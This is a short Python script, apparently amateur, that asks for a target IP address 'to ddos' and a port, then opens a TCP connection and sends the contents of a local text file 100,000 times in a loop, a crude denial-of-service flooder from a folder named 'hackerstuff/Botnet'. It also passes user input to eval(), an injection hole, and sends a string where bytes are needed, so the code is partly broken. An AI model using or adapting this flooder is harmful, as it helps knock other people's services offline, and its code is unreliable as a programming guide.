ip = input("what is the ip to ddos")
port = eval(input("port to send data"))

import os
import socket
amount = 0

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    print("connected")
    for i in range(100000):
        amount = i
        open("C:/Users/Mason Mollenkamp/Desktop/repo/mathon/hackerstuff/Botnet/Message.txt")
        s.send(open("C:/Users/Mason Mollenkamp/Desktop/repo/mathon/hackerstuff/Botnet/Message.txt").read())
        print("Sent {} files".format(amount))
        os.system("cls")
except Exception as e:
    print(e)